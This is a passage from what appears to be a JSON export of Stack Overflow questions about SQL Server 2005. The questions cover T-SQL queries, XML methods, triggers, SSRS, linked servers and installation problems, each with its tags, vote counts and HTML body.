syntax.</p>\n"},{"tags":["sql","sql-server","sql-server-2008","tsql","sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":42,"score":0,"question_id":12461892,"title":"views not refreshing /sp_refreshview taking time for certain views even though there is no data in the view","body":"<p>I have got 2 client's databases(client1 and client 2).As a part of testing, I have restore those 2 databases in my local server.</p>\n\n<p>Views are created in a database called configDB(same server) and are pointing to  tables in a database  called CurrentsourceDB(data of client1).Now I have \nrenamed the CurrentsourceDB to CurrentsourceDB_old and \nsource2db(data of client2) to CurrentsourceDB\n(client1's data db and client2's data db both have same objects, same structure. The only difference is with data ).\nNow when I query the view it has to show data based on source2db(client2's data) But it still shows data based on source1(client1's data).</p>\n\n<p>So I have to either refresh all the view or just alter all the views then I can see the view's data based on present source database,source2db\nWhy does it happen, and is there any way to resolve the problem apart from refreshing?</p>\n"},{"tags":["sql-server-2005","reportingservices-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":38,"score":0,"question_id":12919061,"title":"Report Parameter Values in SSRS","body":"<p>I need to generate semi-monthly (1-15 and 16-last day of month) and monthly reports based on the same report template. I put two parameters on the report template. The second parameter will be the date of execution, which it 15 and last day of month. I can define it on the report parameter when I design the report. I do not want to create 3 report templates to take care of it. Do you know how I can define the 1st and 16th of each month on the first Report Parameter Values in report subscription on the report manager. Thank you in advance.</p>\n"},{"tags":["sql","sql-server","sql-server-2005","group-by","aggregate"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":53,"score":1,"question_id":12937878,"title":"Retrieve row of aggregate on primary key with group by","body":"<p>Ok so I know you can't pull specific fields without an aggregate when you perform a SQL command with a group by, but it seems to me that if you are doing an aggregate on a primary key that is guaranteed to be unique, there should be a way to pull the other rows of that column along with it.  Something like this:</p>\n\n<pre><code>SELECT Max(id), \n       foo, \n       bar \nFROM   mytable \nGROUP  BY value1, \n          value2 \n</code></pre>\n\n<p>So ID is guaranteed to be unique, so it will have exactly 1 value for foo and bar, is there a way to generate a query like this?</p>\n\n<p>I have tried this, but MyTable in this case has millions of rows, and the run-time for this is unacceptable:</p>\n\n<pre><code>SELECT * \nFROM   mytable \nWHERE  id IN (SELECT Max(id) \n              FROM   mytable \n              GROUP  BY value1, \n                        value2) \n       AND ...\n</code></pre>\n\n<p>Ideally I would like a solution that works at least as far back as SQL server 2005, but if there are better solutions in the later versions I would like to hear them as well.</p>\n"},{"tags":["sql-server-2005","xquery","exists"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":34,"score":0,"question_id":12931329,"title":"XQuery exists method","body":"<p>I am trying to get the following exists function to work, but I'm obviously doing something wrong. Essentially, what I want to see is a bit indicating if Exerciser <strong>EVER</strong> contained Y. So in my resultset I'd have rn = 1 with start and end dates for Exerciser X, but a bit indicating true as some previous results contained an Exerciser = \"Y\". </p>\n\n<p>Any help and explanation of what I am doing wrong is much appreciated. I was following (or at least trying to) examples specified <a href=\"http://www.simple-talk.com/sql/learn-sql-server/the-xml-methods-in-sql-server/\" rel=\"nofollow\">here</a> if that helps. My current broke query is as follows. If you comment out the last column (PreviouslyContainedY) it will show you some results.</p>\n\n<p><strong>Edit:</strong> I've got it working now on a 2008 instance with my modified SQL. I expect it'll work on 2005, but I'll have to wait till I'm back at work to test it. My problem now is, I don't understand why my first attempt didn't work. I thought I could reference Exerciser in the exists method in much the same way I am referencing it in line above (column alias \"Exerciser\"). Can someone explain what was wrong with my first attempt? </p>\n\n<pre><code>DECLARE @x XML = '&lt;Root xmlns=\"http://myurl.com/services/\" xmlns:i=\"http://www.w3.org/2001/XMLSchema-instance\"&gt;\n&lt;Things&gt;\n    &lt;Thing&gt;\n      &lt;EndDate&gt;2007-03-31&lt;/EndDate&gt;\n      &lt;StartDate&gt;1998-01-01&lt;/StartDate&gt;\n      &lt;Exerciser&gt;Y&lt;/Exerciser&gt;\n    &lt;/Thing&gt;\n    &lt;Thing&gt;\n      &lt;EndDate&gt;2012-03-31&lt;/EndDate&gt;\n      &lt;StartDate&gt;2007-04-01&lt;/StartDate&gt;\n      &lt;EndReasonCode&gt;10&lt;/EndReasonCode&gt;\n      &lt;Exerciser&gt;Y&lt;/Exerciser&gt;\n    &lt;/Thing&gt;\n    &lt;Thing&gt;\n      &lt;EndDate&gt;2012-06-28&lt;/EndDate&gt;\n      &lt;StartDate&gt;2012-04-23&lt;/StartDate&gt;\n      &lt;EndReasonCode&gt;20&lt;/EndReasonCode&gt;\n      &lt;Exerciser&gt;Y&lt;/Exerciser&gt;\n    &lt;/Thing&gt;\n    &lt;Thing&gt;\n      &lt;EndDate&gt;2012-09-30&lt;/EndDate&gt;\n      &lt;StartDate&gt;2012-06-29&lt;/StartDate&gt;\n      &lt;Exerciser&gt;X&lt;/Exerciser&gt;\n    &lt;/Thing&gt;\n  &lt;/Things&gt;&lt;/Root&gt;'\n\n  ;WITH XMLNAMESPACES ('http://myurl.com/services/' AS p)\n\nSELECT ROW_NUMBER() OVER (ORDER BY rp.regperiod.value ('(p:StartDate/text())[1]','varchar(20)') DESC) AS rn,\n       rp.regperiod.value ('(p:StartDate/text())[1]','varchar(20)') AS StartDate,\n       rp.regperiod.value ('(p:EndDate/text())[1]','varchar(20)') AS EndDate, \n       rp.regperiod.value ('(p:Exerciser/text())[1]','varchar(200)') AS Exerciser,\n       -- rp.regperiod.exist('[p:Exerciser=\"Y\"]')  AS PreviouslyContainedY\n       -- The following change works. I don't understand why the line above doesn't though.\n       x.exist('/p:Root/p:Things/p:Thing[p:Exerciser=\"Y\"]')  AS PreviouslyContainedY\n\nFROM (\n    SELECT @x AS x \n    ) y CROSS APPLY y.x.nodes('/p:Root/p:Things/p:Thing') rp(regperiod)\n</code></pre>\n"},{"tags":["sql","sql-server-2005"],"answer_count":2,"favorite_count":2,"up_vote_count":3,"down_vote_count":0,"view_count":79,"score":3,"question_id":12935103,"title":"First INSERT, then - if OK - DELETE","body":"<p>This SQL SERVER 2005 statement first deletes 18 record ordering them by <code>FIELD1 ASC</code>, then inserts the same 18 records in a clone table:</p>\n\n<pre><code>WITH  q AS\n        (\n        SELECT TOP 18 *\n        FROM    pippo\n        ORDER BY FIELD1 ASC /* You may want to add ORDER BY here */\n        )\nDELETE\nFROM    q\nOUTPUT DELETED.* INTO TableNew\n</code></pre>\n\n<p>Please help me to convert the previous statement in order to first <code>INSERT</code>, and <code>THEN</code> - <code>IF INSERT</code> HAS BEEN OK - delete the same 18 records; I've just tried but the following code gives the error, </p>\n\n<p><code>Msg 102, Level 15, State 1, Line 7 Incorrect syntax near 'INSERTED'.</code></p>\n\n<pre><code>WITH  q AS\n        (\n        SELECT TOP 18 *\n        FROM    pippo\n        ORDER BY ID_OL ASC /* You may want to add ORDER BY here */\n        )\ninsert into tablenew select * from q OUTPUT INSERTED.* INTO TABLENEW\n</code></pre>\n\n<p>Thank you in advance for your kind help.</p>\n"},{"tags":["sql-server-2005","ssis","management-studio"],"answer_count":4,"favorite_count":2,"up_vote_count":19,"down_vote_count":0,"view_count":38089,"score":19,"question_id":888709,"title":"How do I view the SSIS packages in SQL Server Management Studio?","body":"<p>Argh! I created an SSIS package via an Import Wizard and I can't find the SSIS packages on the server using Management Studio. Execute an SSIS package doesn't appear as an option when I go into job scheduler, either.</p>\n"},{"tags":["database","eclipse","sql-server-2005","birt"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":1503,"score":1,"question_id":5323883,"title":"BIRT: how to connect to SQL Server 2005","body":"<p>I am having trouble writing the database URL for a SQL Server 2005 database when creating a data source for a BIRT report. The URL I have written looks like this:</p>\n\n<pre><code>jdbc:microsoft:sqlserver://host:port;databasename=name;user=userName;password=yourPwd\n</code></pre>\n\n<p>I placed the sqljdbc.jar (jdbc 3.0) in the following location:</p>\n\n<pre><code>eclipse/plugins/org.eclipse.birt.report.data.oda.jdbc_2.6.1.v20100909/drivers\n</code></pre>\n\n<p>When I press the \"Test Connection\" button in the \"Edit Data Source\" dialog I get the following error:</p>\n\n<pre><code>The selected driver cannot parse the given url.\n</code></pre>\n\n<p>Can you give me any hints on how to solve this?</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":2,"favorite_count":2,"up_vote_count":3,"down_vote_count":0,"view_count":62,"score":3,"question_id":12932126,"title":"INSERT into another table, and then DELETE from the source table","body":"<p>How can I delete the first 18 rows (sorted by FIELD1) from the \"pippo\" table, and then insert THE SAME 18 rows in another clone-table called minnie?</p>\n\n<p>The following code extracts the first 18 rows ordering by FIELD1, and then deletes them:</p>\n\n<pre><code>WITH  q AS\n        (\n        SELECT TOP 18 *\n        FROM    pippo\n        ORDER BY FIELD1 ASC /* You may want to add ORDER BY here */\n        )\nDELETE\nFROM    q\n</code></pre>\n\n<p>How can I insert the same 18 rows into the minnie table, before deleting them?</p>\n\n<p>Thank you in advance for your kind help.</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":39,"score":2,"question_id":12931590,"title":"Are Select Top(n) and Delete Top(n) same?","body":"<p>If use the select statement:</p>\n\n<pre><code>select top (18) * from pippo;\n</code></pre>\n\n<p>And I use the delete statement:</p>\n\n<pre><code>delete top (18) from pippo;\n</code></pre>\n\n<p>I would like to know if the 18 selected and deleted rows are the same.<br>\nAny help?</p>\n\n<p>EDIT after having accepted the answer:</p>\n\n<p>I have found the following solution here: <a href=\"http://stackoverflow.com/questions/733668/delete-the-first-record-from-a-table-in-sql-server-without-a-where-condition\">Delete the &#39;first&#39; record from a table in SQL Server, without a WHERE condition</a></p>\n\n<pre><code>WITH  q AS\n        (\n        SELECT TOP 18 *\n        FROM    pippo\n        ORDER BY FIELD1 ASC /* You may want to add ORDER BY here */\n        )\nDELETE\nFROM    q\n</code></pre>\n\n<p>With this solution I sort all the \"pippo\" table by FIELD1, and then I delete the first 18 rows. </p>\n"},{"tags":["sql","sql-server","sql-server-2005","tsql","index"],"answer_count":3,"favorite_count":0,"up_vote_count":7,"down_vote_count":0,"view_count":959,"score":7,"question_id":2292662,"title":"How important is the order of columns in indexes?","body":"<p>I've heard that you should put columns that will be the most selective at the beginning of the index declaration.  Example:</p>\n\n<pre><code>CREATE NONCLUSTERED INDEX MyINDX on Table1\n(\n   MostSelective,\n   SecondMost,\n   Least\n)\n</code></pre>\n\n<p>First off, is what I'm saying correct?  If so, am i likely to see large differences in performance by rearranging the order of the columns in my index or is it more of a \"nice to do\" practice?</p>\n\n<p>The reason I'm asking is because after putting a query through the DTA it recommended that I create an index that had almost all of the same columns in it as an existing index, just in a different order.  I was considering just adding the missing columns to the existing index and calling it good.  Thoughts?</p>\n"},{"tags":["sql","sql-server-2005","sql-server-2000","replication"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":56,"score":0,"question_id":12918131,"title":"How can I modify a trigger at subscribers SQL Server 2005?","body":"<p>I have a SQL Server 2005 publisher with SQL Server 2005 subscribers and one SQL Server 2000 subscriber running merge replication. </p>\n\n<p>Is there anyway to modify triggers at a subscriber with the replicating schema changes set to false (<code>replicate_ddl = 0</code>) without reintializing the whole publication? </p>\n\n<p>A solution where the triggers are only modified on the SQL Server 2005 databases is fine. Thank you.  </p>\n"},{"tags":["asp.net","sql-server-2008","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":117,"score":0,"question_id":12914959,"title":"Cannot bulk load because the file could not be opened. Operating system error code 21(The device is not ready.)","body":"<p>Cannot bulk load because the file could not be opened. Operating system error code 21(The device is not ready.).</p>\n\n<p>Hi All, </p>\n\n<p>I am a newbie to Image Upload in MS SQL Server using ASP.NET. its cool to upload a image in a query from the same machine as the server but when from a remote machine ASP.NET web application to MS SQL Server, I am getting the above mentioned error. </p>\n\n<p>I don't understand what needs to be done, i have seen several threads and forums but i am not able to understand, can you please help me out on the same. I am looking for some descriptive steps to fix this issue.</p>\n\n<pre><code>Session[\"FileName\"] equals some d drive file\n</code></pre>\n\n<p><strong>Query I use:</strong></p>\n\n<pre><code>command.CommandText = \"UPDATE user_info \"\n                                + \"SET User_Image = (SELECT * FROM Openrowset(Bulk '\" + Session[\"FileName\"] + \"', Single_Blob) AS User_Image) \"\n                                + \"WHERE id =\" + \"22222\";\n</code></pre>\n\n<ul>\n<li><p><strong>I use SQL Authentication</strong></p></li>\n<li><p><strong>I have enabled both named pipes + TCP/IP</strong></p></li>\n<li><p>if <strong>EXECUTE AS</strong> is to be used, can someone explain the query. Is there any setting that need to be enabled. I am desperate :(</p></li>\n</ul>\n\n<p>Thanks in advance !</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":41,"score":0,"question_id":12923370,"title":"Serial Number in the form of week number in query","body":"<p>I have used this to get the serial number and count of distinct RepID's for each week. But instead of Serial number(1, 2, 3), I want the serial number value as Week 1, week 2, week 3. How is it possible? This is using SQL Server 2005.Thank you!</p>\n\n<pre><code>Select ROW_NUMBER() OVER (ORDER BY Date) As SlNo, count(distinct(RepID))\nfrom Reptable   \nwhere Month(Date) = @Month\ngroup by Datepart(week, Date)\n</code></pre>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":2,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":47,"score":2,"question_id":12919928,"title":"tsql to return the datafile for an index","body":"<p>I have 3 data files for the Primary filegroup of a database in SQL Server 2005.  Is it possible to determine which data file a particular index resides on, or do they live in more than one datafile within the filegroup?</p>\n"},{"tags":["sql","sql-server","sql-server-2005","datediff"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":97,"score":3,"question_id":12894991,"title":"Removing weekends from a SQL result","body":"<p>I have the following query that produces a number of results for me. One of which is the number of days old each of the records is. </p>\n\n<p>I need a more accurate figure now by removing weekends from the equation. Not sure how to proceed and struggling to understand answers I have found. My query so far is:</p>\n\n<pre><code>select\n    i.incidentnumber,\n    i.priority, \n    i.status, \n    i.subject,\n    i.actualsystem, \n    t.ownerteam, \n    convert(varchar,i.createddatetime,103)[Created],\n    convert(varchar,i.lastmoddatetime,103)[Modified], \n    datediff(day,i.createddatetime,{fn now()})[Days old],\n    datediff(mi,i.createddatetime,{fn now()})[Minutes old],\n    cast(i.createddatetime\n    i.owner\nfrom \n    incident i with (nolock) inner join task t with (nolock) on t.parentlink_recid = i.recid\nwhere \n    i.status &lt;&gt; 'Closed' \n    and i.actualsystem &lt;&gt; 'System Administration' \n    --and i.service &lt;&gt; 'Service Request'\n    and t.status in ('Active','Waiting','Accepted') \n    --and t.ownerteam &lt;&gt; 'UK Service Desk'\n\norder by \n    --t.ownerteam asc\n    --i.actualsystem asc\n    datediff(day,i.createddatetime,{fn now()}) desc\n</code></pre>\n\n<p>I am using SQL server manager and querying a 2005 database. I comment out as necessary. The minutes old is a new column added today. Can anyone help?</p>\n"},{"tags":["sql","sql-server-2008","sql-server-2005"],"answer_count":2,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":74,"score":2,"question_id":12915765,"title":"Continue inserting data in temporary table when met exception in SQL Server 2005 (also for 2008)","body":"<p>I have 2 simple tables</p>\n\n<pre><code>+------|---------|----------+\n+  ID  |  Value  |   Test   +\n+------|---------|----------+\n+  3   |   Test  |   12345  +\n+  4   |  MyVal  |   56789  +\n+  5   |  Another|   101010 +\n+------|---------|----------+\n\n\n\n+------|---------|----------+\n+  ID  |  Value  |   Test   +\n+------|---------|----------+\n+  3   |   Test  |   12345  +\n+  7   |  MyVal12|   56789  +\n+  5   |  Another|   101010 +\n+------|---------|----------+\n</code></pre>\n\n<p>The <code>ID</code> from both tables are primary keys.</p>\n\n<p>In my stored procedure, I create a temporary table like this:</p>\n\n<pre><code>CREATE TABLE #tempTable(\n        ID int NOT NULL PRIMARY KEY NONCLUSTERED,\n        FIELD VARCHAR(255))\n</code></pre>\n\n<p>and the part of my procedure stored with <code>try-catch</code> block:</p>\n\n<pre><code>BEGIN TRY\nINSERT INTO #tempTable(ID, FIELD)\nEXEC sp_executesql @myCustomSql, @paramList, @param1, @param2 ...\nEND TRY\n\nBEGIN CATCH\n      // what to put here ?\nEND CATCH\n</code></pre>\n\n<p>I want to add rows to my temporary table (you'll see the duplicates for ID = 3 and 5) and I want to continue adding. Finally I want to have the following content for table:</p>\n\n<pre><code>+------|---------+\n+  ID  |  FIELD  +\n+------|---------+\n+  3   |   Test  +\n+  4   |  MyVal  +\n+  5   |  Another+ \n+  7   |  MyVal12+\n+------|---------+\n</code></pre>\n\n<p>I gave here a simplified example, in my database I have over one hundred thousand rows and many columns.</p>\n\n<p>Thanks</p>\n"},{"tags":["sql-server-2005","triggers"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":43,"score":0,"question_id":12916463,"title":"Insert deleted rows in trigger","body":"<p>I need to insert the deleted rows from table Table_A to Table_B which have the same structure<br>\n(something like recycle bin) but i don't have much experience in SQL SERVER Triggers  </p>\n\n<pre><code>CREATE TRIGGER dbo.Table_A_Delete_Instead_Of_Trigger\nON dbo.Table_A\nINSTEAD OF DELETE\nAS\nBEGIN    \n     INSERT INTO Table_B \n     SELECT T \n\n     DELETE T                  \nEND\n</code></pre>\n\n<p>please spare my lake of experience. Thanks.</p>\n"},{"tags":["sql-server","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":1142,"score":1,"question_id":5741212,"title":"SQL needed: sum over values by month","body":"<p>i have  an table   with values like this:</p>\n\n<pre><code>count1   count2  count3  month\n12        1       4       01/12/2011\n6         5       4       23/12/2011\n14        6       9       11/06/2011\n8         5       4       19/06/2011\n</code></pre>\n\n<p>How do I get the following results?</p>\n\n<pre><code>count1   count2  count3  month\n18        6       8       12\n22        11      13      06\n</code></pre>\n"},{"tags":["sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":56,"score":0,"question_id":12914662,"title":"cannot run linked server query with sa account but can run with windows authentication user","body":"<p>I have created a linked server(for excel) and when I run the query like below</p>\n\n<p>It works when I connect SQL Server Management Studio with windows authentication and run the below query.</p>\n\n<pre><code>select * from linkserver...sheet1$\n</code></pre>\n\n<p>The same query gets the following error if I login with sa account.</p>\n\n<pre><code> The OLE DB provider \"Microsoft.ACE.OLEDB.12.0\" for linked server \"exportlink\"\n reported an error. The provider did not give any information about the error.\n Msg 7303, Level 16, State 1, Line 1\n Cannot initialize the data source object of OLE DB provider   \n \"Microsoft.ACE.OLEDB.12.0\" for     linked server \"linkedserver\n</code></pre>\n\n<p>Though it seems a security issue, I don't know how to fix it. </p>\n"},{"tags":["sql","sql-server","sql-server-2005","stored-procedures"],"answer_count":7,"favorite_count":2,"up_vote_count":11,"down_vote_count":1,"view_count":48780,"score":10,"question_id":170328,"title":"Executing a stored procedure within a stored procedure","body":"<p>I would like to execute a stored procedure within a stored procedure eg </p>\n\n<pre><code>EXEC SP1\n\nBEGIN\n\nEXEC SP2\nEND\n</code></pre>\n\n<p>But I only want SP1 to finish after SP2 has finished running so I need to find a way for SP1 to wait for SP2 to finish before SP1 ends.</p>\n\n<p>Thanks</p>\n"},{"tags":["sql-server","sql-server-2005","tsql","sql-server-2008","insert"],"answer_count":11,"favorite_count":3,"up_vote_count":17,"down_vote_count":0,"view_count":24839,"score":17,"question_id":2624713,"title":"How do I insert multiple rows WITHOUT repeating the \"INSERT INTO dbo.Blah\" part of the statement?","body":"<p>I know I've done this before years ago, but I can't remember the syntax, and I can't find it anywhere due to pulling up tons of help docs and articles about \"bulk imports\".</p>\n\n<p>Here's what I want to do, but the syntax is not exactly right... please, someone who has done this before, help me out :)</p>\n\n<pre><code>INSERT INTO dbo.MyTable (ID, Name)\nVALUES (123, 'Timmy'),\n    (124, 'Jonny'),\n    (125, 'Sally')\n</code></pre>\n\n<p>I know that this is <em>close</em> to the right syntax. I might need the word \"BULK\" in there, or something, I can't remember. Any idea?</p>\n\n<p>EDIT: Particularly, I need this for a SQL Server 2005 database. I've tried this code, to no avail:</p>\n\n<pre><code>DECLARE @blah TABLE\n(\n    ID INT NOT NULL PRIMARY KEY,\n    Name VARCHAR(100) NOT NULL\n)\n\nINSERT INTO @blah (ID, Name)\n    VALUES (123, 'Timmy')\n    VALUES (124, 'Jonny')\n    VALUES (125, 'Sally')\n\nSELECT * FROM @blah\n</code></pre>\n\n<p>I'm getting <code>Incorrect syntax near the keyword 'VALUES'.</code></p>\n"},{"tags":["sql-server","sql-server-2005","command-line","installation"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":12909340,"title":"Error in Commandline Installation of SQL Server 2005 Express SP 3","body":"<p>I am facing a strange issue while installing SQL Server Express 2005 on Windows XP SP3 (German OS) machine.</p>\n\n<p>PFB the description:</p>\n\n<ol>\n<li>I am performing a silent installation of SQL Server 2005 via a .bat file.</li>\n<li><p>The installation command is as following :</p>\n\n<pre><code>start /wait Setup.exe /qn INSTANCENAME=&lt;instance name&gt; ADDLOCAL=SQL_Engine SAPWD=\"strong password&gt;\" SECURITYMODE=SQL SQLACCOUNT=\"NT-AUTORITT\\SYSTEM\" DISABLENETWORKPROTOCOLS=0 TARGETDIR=\"C:\\Program Files\\Microsoft SQL Server \\\" \n</code></pre></li>\n<li><p>The SQLACCOUNT parameter is derived at run-time be checking the language of the OS. In English, it is \"NT AUTHORITY\\SYSTEM\" .In German, it is \"NT-AUTORITT\\SYSTEM\"</p></li>\n<li><p>If I provide the above command directly to the command line, then installation is successful. But, if I put the same command in the bat file, then installation fails.</p></li>\n<li><p>The reason for failure mentioned in the log files is that the system is not able to recognize the local system account.</p></li>\n<li>In the log files, I checked that when the passed parameter is \"NT-AUTORITT\\SYSTEM\" then, SQL logs contain the name of the parameter as \"NT-AUTORIT-T\\SYSTEM\".\nThis parameter is invalid and hence, the installation is failing.</li>\n</ol>\n\n<p><img src=\"http://i.stack.imgur.com/2kmzd.jpg\" alt=\"Screenshot for different scenarios\"></p>\n\n<p>I also tried providing the \".\\LocalSystem\" as the parameter but, still installation fails.</p>\n\n<p>Please Note:</p>\n\n<p>I faced a similar issue while installing SQL Server 2008 Express on the same machine.\nI changed the installation command from \"NT-AUTORITT\\SYSTEM\" to \"NT AUTHORITY\\SYSTEM\", then the issue was solved.</p>\n"},{"tags":["xml","sql-server-2005","grouping"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":27,"score":1,"question_id":12908455,"title":"Obtain a count of XML elements per group in SQL","body":"<p>I have an XML column that looks something like the following;</p>\n\n<pre><code>DECLARE @str AS VARCHAR(8000)\n\nSET @str = '&lt;Root xmlns=\"http://myurl.com/services/\" xmlns:i=\"http://www.w3.org/2001/XMLSchema-instance\"&gt;\n           &lt;Notifications&gt;\n               &lt;Notification&gt;\n                  &lt;NotificationDate&gt;2012-08-16&lt;/NotificationDate&gt;\n                  &lt;Scopes&gt;\n                    &lt;NotificationScope&gt;\n                        &lt;Code&gt;a&lt;/Code&gt;\n                    &lt;/NotificationScope&gt;  \n                    &lt;NotificationScope&gt;\n                        &lt;Code&gt;b&lt;/Code&gt; \n                    &lt;/NotificationScope&gt;\n                  &lt;/Scopes&gt;\n                &lt;/Notification&gt;\n                &lt;Notification&gt;\n                  &lt;NotificationDate&gt;2012-08-20&lt;/NotificationDate&gt;\n                  &lt;Scopes&gt;\n                    &lt;NotificationScope&gt;\n                        &lt;Code&gt;a&lt;/Code&gt;\n                    &lt;/NotificationScope&gt;\n                  &lt;/Scopes&gt;\n                &lt;/Notification&gt;\n            &lt;/Notifications&gt;&lt;/Root&gt;'\n</code></pre>\n\n<p>I want to be able to get a count of the number of NotificationScope Elements per notification. So for example, I am looking for something like;</p>\n\n<pre><code>Notification Date                   Count\n 2012-08-16                          2\n 2012-08-20                          1\n</code></pre>\n\n<p>In fact, as in reality as this data is obtained from a database column, I am really only interested in returning those records that have ANY Notification Date with a Count that is greater than 1. </p>\n\n<p>So far, all I've managed to come up with is the following, but that just gives me a count of ;</p>\n\n<pre><code>declare @xmlvar XML;\nset @xmlvar = (SELECT cast(@str AS XML))\n;WITH XMLNAMESPACES('http://myurl.com/services/' AS p)\nSELECT * FROM (\nselect @xmlvar.value('count(/p:Root/p:Notifications/p:Notification/p:Scopes/p:NotificationScope)', 'INT') AS 'NotificationScopeCount',\n       @xmlvar.value('count(/p:Root/p:Notifications/p:Notification/p:NotificationDate)', 'INT') AS 'NotificationDateCount'\n ) a WHERE NotificationScopeCount &gt; NotificationDateCount\n</code></pre>\n\n<p>but ideally, I'd like to be able to get the associated date also. Please forgive me if this is a horrible way of going about this, I haven't used XML datatypes much before in SQL. </p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":9,"favorite_count":6,"up_vote_count":30,"down_vote_count":1,"view_count":81626,"score":29,"question_id":576441,"title":"Insert all values of a table into another table in SQL","body":"<p>I am trying to insert all values of one table into another. But the insert statement accepts values, but i would like it to accept a select * from the initial_Table. Is this possible?</p>\n"},{"tags":["sql-server-2005","common-table-expression","data-type-conversion"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":39,"score":0,"question_id":12900527,"title":"CTE data conversion error - Fine with temp tables","body":"<p>So, I have a CTE that's throwing the error: <code>Msg 8114, Level 16, State 5, Line 1 Error converting data type nvarchar to float.</code>  The problem is that if I break down the CTE into temp tables, everything runs fine!</p>\n\n<p>Below is a slight simplification of what I'm doing (data types are accurate, I just renamed things, created bogus data, removed a couple extra joins and where clauses that don't seem to effect the error, etc.)... note that this sample does work correctly, which just adds to my confusion:</p>\n\n<pre><code>--Build and populate sample data\ncreate table vals\n(\n    groupID int,\n    valName nvarchar(50),\n    val     nvarchar(50)\n)\ninsert into vals(groupID, valName, val)\nselect 1, 'setting1', '12:00' union\nselect 1, 'setting2', '18:00' union\nselect 1, 'setting3', '3.2' union\nselect 2, 'setting1', '9:00' union\nselect 2, 'setting3', '4' union\nselect 2, 'setting5', 'steve'\n\ncreate table collected\n(\n    groupID int,\n    timeUTC datetime,\n    collected float\n)\ninsert into collected(groupID, timeUTC, collected)\nselect 1, '2012-09-12 18:00', 2.8 union\nselect 1, '2012-09-12 18:30', 3.0 union\nselect 1, '2012-09-12 19:00', 3.3 union\nselect 1, '2012-09-12 19:30', 4.0 union\nselect 1, '2012-09-12 20:00', 2.5 union\nselect 2, '2012-09-12 18:00', 3.5 union\nselect 2, '2012-09-12 18:30', 3.9 union\nselect 2, '2012-09-12 19:00', 4.6 union\nselect 2, '2012-09-12 19:30', 4.2 union\nselect 2, '2012-09-12 20:00', 4.3\n\n\n--Here's the CTE that errors on the actual dataset\n;with triggerVal as (\n    select groupID,\n        [trg] = min(cast(val as float))\n    from vals\n    where valName = 'setting3'\n    group by groupID\n), currentVal as (\n    select c.groupID, c.timeUTC,\n        [curr] = c.collected\n    from collected c\n        join (\n            select groupID, [lastTime] = max(timeUTC)\n            from collected\n            group by groupID\n        ) l on c.groupID=l.groupID\n            and c.timeUTC = l.lastTime\n)\nselect t.groupID, c.timeUTC, t.trg, c.curr\nfrom triggerVal t\n    join currentVal c on t.groupID=c.groupID\n</code></pre>\n\n<p>Again, in my live data, if I break the above CTE into temp tables (<code>#triggerVal</code> and <code>#currentVal</code>) everything runs fine.  While it's not the end of the world for me to modify my code, I'd really like to understand what's happening!</p>\n"},{"tags":["tsql","sql-server-2005"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":65,"score":0,"question_id":11265868,"title":"How to Order By Column when Column isn't of the same type?","body":"<p>I have fields in the column that look like so:</p>\n\n<pre><code>2/8B, 3, 3/8B, 4/8B, 2, 6, 4/9, 9, 8/9, 8, 7, 1, 5/9, 10, 3/9, 2/9, 7/9, 6/8B, 6/9, 1/9, 5, 8B, 5/8B, 4\n</code></pre>\n\n<p>I need to sort this list in a manner like: </p>\n\n<pre><code>1, 1/9, 2, 2/8B, 2/9, 3, 3/8B, 3/9, 4, 4/8B, 4/9, 5, 5/8B, 5/9, 6, 6/8B, 6/9, 7, 7/9, 8, 8/9, 8B, 9, 10\n</code></pre>\n\n<p>How do I Order By to create this output?</p>\n\n<p>To clear up any confusion (1/2) is not a fraction. the \"/\" is just a separator. </p>\n"},{"tags":["c#","sql-server","sql-server-2005","linq-to-sql"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":87,"score":1,"question_id":11992498,"title":"Why isn't DataContext not updating with external database changes?","body":"<p>If I change data within Microsoft SQL Server Management Studio while my application is running, LINQ will not get the new data, even if I run</p>\n\n<pre><code>myContext.Refresh(System.Data.Linq.RefreshMode.OverwriteCurrentValues)\n</code></pre>\n\n<p>The only way to get the new changes (that I've found so far...) is to recreate the data context.</p>\n\n<pre><code>myContext.Dispose();\nmyContext = new MyDataContext();\n</code></pre>\n\n<p>I must be blind and this has to be really obvious, but I've wasted enough time on this to allow myself to post this dumb question... -_-''</p>\n\n<p>Thanks!</p>\n\n<p><strong>Edit</strong></p>\n\n<p>When I load data from SQL:</p>\n\n<pre><code>myBindingSource.DataSource = myContext.myTable.Where(o =&gt; o.id != 0).OrderBy(o =&gt; o.name);\n</code></pre>\n"},{"tags":["c#","asp.net","sql-server-2005","stored-procedures"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":131,"score":0,"question_id":12857828,"title":"Pass List/ Array to stored procedure and retrieve parameters one by one in stored procedure.?","body":"<p>I have Drop Down List with check box in my asp.net page.\nin that page i am going to checked multiple / single / all values. 